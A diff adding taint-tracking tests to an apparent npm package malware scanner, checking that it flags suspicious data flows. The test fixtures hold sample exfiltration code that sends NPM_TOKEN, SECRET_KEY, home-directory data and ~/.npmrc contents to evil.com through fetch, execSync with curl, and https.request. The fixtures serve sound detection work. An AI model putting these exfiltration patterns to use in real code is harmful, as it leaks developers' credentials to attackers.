@@ -224,6 +224,78 @@ req.end();
       assert(t, 'Should detect process.env.USER exfil as suspicious_dataflow');
     } finally { cleanupTemp(tmp); }
   });
+
+  // --- Intra-file taint tracking tests ---
+
+  await asyncTest('TAINT: Aliased require("os") detected via taint tracking', async () => {
+    const tmp = makeTempPkg(`const myOs = require("os");\nconst h = myOs.homedir();\nfetch("http://evil.com?d=" + h);`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect aliased os.homedir() via taint tracking');
+      assert(t.taint_tracked === true, 'Should have taint_tracked flag');
+      assertIncludes(t.message, 'os.homedir', 'Message should include os.homedir');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('TAINT: Destructured child_process exec detected', async () => {
+    const tmp = makeTempPkg(`const { execSync } = require("child_process");\nconst tok = process.env.NPM_TOKEN;\nexecSync("curl http://evil.com -d " + tok);`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect destructured execSync with curl as sink');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('TAINT: Chained assignment from aliased os', async () => {
+    const tmp = makeTempPkg(`const myOs = require("os");\nconst h = myOs.homedir();\nconst data = h;\nfetch("http://evil.com?d=" + data);`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect chained aliased os.homedir() via taint tracking');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('TAINT: Aliased process.env detected', async () => {
+    const tmp = makeTempPkg(`const env = process.env;\nconst tok = env.NPM_TOKEN;\nfetch("http://evil.com?t=" + tok);`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect aliased process.env access');
+      assert(t.taint_tracked === true, 'Should have taint_tracked flag');
+      assertIncludes(t.message, 'NPM_TOKEN', 'Message should include NPM_TOKEN');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('TAINT: Safe module (path) does NOT trigger taint', async () => {
+    const tmp = makeTempPkg(`const p = require("path");\nconst result = p.join("/a", "b");\nconsole.log(result);`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(!t, 'Should NOT detect suspicious_dataflow for safe module path');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('TAINT: Aliased fs.readFileSync on sensitive path detected', async () => {
+    const tmp = makeTempPkg(`const myFs = require("fs");\nconst data = myFs.readFileSync("/home/user/.npmrc", "utf8");\nfetch("http://evil.com", { body: data });`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect aliased fs.readFileSync on .npmrc');
+      assert(t.taint_tracked === true, 'Should have taint_tracked flag');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('TAINT: Aliased https sink detected', async () => {
+    const tmp = makeTempPkg(`const h = require("https");\nconst tok = process.env.SECRET_KEY;\nh.request({ hostname: "evil.com", path: "/" + tok });`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect aliased https.request as network sink');
+      assert(t.taint_tracked === true, 'Should have taint_tracked flag');
+      assertIncludes(t.message, 'https.request', 'Message should include https.request');
+    } finally { cleanupTemp(tmp); }
+  });
 }
 
 module.exports = { runDataflowTests };
